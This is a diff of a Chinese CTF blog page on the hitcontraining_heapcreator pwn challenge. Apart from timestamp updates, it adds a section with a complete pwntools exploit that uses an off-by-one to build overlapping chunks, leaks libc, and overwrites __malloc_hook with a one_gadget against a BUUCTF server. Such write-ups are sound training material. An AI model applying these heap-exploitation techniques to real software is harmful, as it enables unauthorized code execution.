@@ -83,7 +83,7 @@
                         <input id="switch_default" type="checkbox" class="switch_default">
                         <label for="switch_default" class="toggleBtn"></label>
             </div>
-            <form id="gridea-search-form" data-update="1598931580768" action="/search/index.html">
+            <form id="gridea-search-form" data-update="1598941117550" action="/search/index.html">
                 <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
             </form>
         </div>
@@ -102,7 +102,7 @@
                         <!--zh-->
                         <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
                     </div>
-                    <form id="gridea-search-form" data-update="1598931580768" action="/search/index.html">
+                    <form id="gridea-search-form" data-update="1598941117550" action="/search/index.html">
                         <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
                     </form>
                     <!--en-->
@@ -178,9 +178,9 @@
                                 Date: <a href="#">2020-09-01</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">7.1
+                                    href="#">9.4
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">1469</a></span>
+                                    <span class="post-words">words:<a href="#">1891</a></span>
                                     
                                             Views:
                                             <span data-hk-page="current"> - </span>
@@ -394,6 +394,82 @@ add(0x60,b'A' * 0x13 + p64(one_gadget))
 pause()
 p.interactive()
 </code></pre>
+<h3 id="又实验了两次失败的方法终于通了">又实验了两次，失败的方法终于通了</h3>
+<p>怎么说呢，比赛不给libc果然是流氓题<br>
+在github上下了俩libc都不行，最后用buuctf资源库里面提供的libc打通了<br>
+exp没变，就是多加了两行one_gadget_list(哈哈哈哈哈哈哈草)</p>
+<pre><code class="language-python">from pwn import *
+
+#context.log_level = 'debug'
+local = 0
+
+if local == 1:
+	p = process('./heapcreator')
+else:
+	p = remote('node3.buuoj.cn',26902)
+
+libc = ELF('./libc-2.23.so')
+
+def add(size,content):
+	p.sendlineafter('Your choice :','1')
+	p.sendlineafter('Size of Heap : ',str(size))
+	p.sendafter('Content of heap:',content)
+
+def edit(index,content):
+	p.sendlineafter('Your choice :','2')
+	p.sendlineafter('Index :',str(index))
+	p.sendafter('Content of heap : ',content)
+
+def show(index):
+	p.sendlineafter('Your choice :','3')
+	p.sendlineafter('Index :',str(index))
+
+def delete(index):
+	p.sendlineafter('Your choice :','4')
+	p.sendlineafter('Index :',str(index))
+
+print(&quot;初步思路是off-by-one，可以溢出一个字节，所以我们考虑构造重叠chunk&quot;)
+
+add(0x18,'A')	#chunk0 : to overflow the next chunk
+add(0x30,'B')	#chunk1
+add(0x60,'C')	#chunk2
+add(0x10,'D')	#chunk3 : to protect
+edit(0,b'B' * 0x18 + b'\xf1')
+
+delete(1)
+print(&quot;此时big chunk已经构造完成，by gdb , we know the unsorted bin fd ptr and bk ptr&quot;)
+delete(2)
+print(&quot;by free 0x60 , we can change the fd pointer to fastbin attack&quot;)
+print(&quot;this method is 'one_gadget' &quot;)
+print(&quot;if we cannot success ,we could use some methods to attack got&quot;)
+
+add(0xe0,'E')	#chunk4
+print(&quot;we can leak libc&quot;)
+show(1)
+#p.recv()
+
+p.recvuntil('Content : ')
+__malloc_hook = u64(p.recv(6) + b'\x00\x00') - 37 - 0x10
+libc_base = __malloc_hook - libc.symbols['__malloc_hook']
+#one_gadget_list = [0x3f3d6,0x3f42a,0xd5bf7]
+#one_gadget_list = [0x45226,0x4527a,0xf0364,0xf1207]
+#one_gadget_list = [0x45206,0x4525a,0xef9f4,0xf0897]
+one_gadget_list = [0x45216,0x4526a,0xf02a4,0xf1147]
+one_gadget = libc_base + one_gadget_list[1]
+print(hex(libc_base))
+print(&quot;one_gadget:&quot; + hex(one_gadget))
+
+print(&quot;by gdb , we know we already have leaked the libc&quot;)
+print(&quot;the next,we do fake chunk&quot;)
+payload = p64(0) * 3 + p64(0x41) + p64(0) * 7 + p64(0x21) + p64(0xe0) + p64(0x9ba050) + p64(0) + p64(0x71)
+payload = payload + p64(__malloc_hook-0x23)
+edit(1,payload)
+
+add(0x60,p64(__malloc_hook-0x23))
+add(0x60,b'A' * 0x13 + p64(one_gadget))
+
+p.interactive()
+</code></pre>
 
                         </div>
                         
@@ -406,6 +482,7 @@ p.interactive()
 <ul>
 <li><a href="#%E6%88%90%E5%8A%9F%E7%9A%84%E6%96%B9%E6%B3%95%E5%80%9F%E5%8A%A9heaparray%E6%9D%A5%E6%94%B9%E5%86%99%E6%8C%87%E9%92%88">成功的方法：借助heaparray来改写指针</a></li>
 <li><a href="#%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%96%B9%E6%B3%95one_gadget%E6%89%93__malloc_hook">失败的方法：one_gadget打__malloc_hook</a></li>
+<li><a href="#%E5%8F%88%E5%AE%9E%E9%AA%8C%E4%BA%86%E4%B8%A4%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%96%B9%E6%B3%95%E7%BB%88%E4%BA%8E%E9%80%9A%E4%BA%86">又实验了两次，失败的方法终于通了</a></li>
 </ul>
 </li>
 </ul>
@@ -441,8 +518,8 @@ p.interactive()
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
                                                         <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/yi-dao-got-biao-ke-xie-de-off-by-one-hitcontraining_heapcreator/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/yi-dao-got-biao-ke-xie-de-off-by-one-hitcontraining_heapcreator/&sharesource=qzone&title=一道got表可写的off-by-one — hitcontraining_heapcreator&pics=https://l3mon629.github.io/images/avatar.png?v=1598931580768&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/yi-dao-got-biao-ke-xie-de-off-by-one-hitcontraining_heapcreator/&sharesource=weibo&title=一道got表可写的off-by-one — hitcontraining_heapcreator + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1598931580768 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/yi-dao-got-biao-ke-xie-de-off-by-one-hitcontraining_heapcreator/&sharesource=qzone&title=一道got表可写的off-by-one — hitcontraining_heapcreator&pics=https://l3mon629.github.io/images/avatar.png?v=1598941117550&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/yi-dao-got-biao-ke-xie-de-off-by-one-hitcontraining_heapcreator/&sharesource=weibo&title=一道got表可写的off-by-one — hitcontraining_heapcreator + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1598941117550 "><i class="fa fa-weibo "></i></a>
                                                         
                                                                 </span>
                                                                 <!--en-->
@@ -532,7 +609,7 @@ p.interactive()
                     CheckVersion();
                     
                     var newDate = new Date();
-                    newDate.setTime(1598931580768);
+                    newDate.setTime(1598941117550);
                     console.log(" Blog Update Time: " + newDate.toLocaleDateString());
                     console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
                 </script>
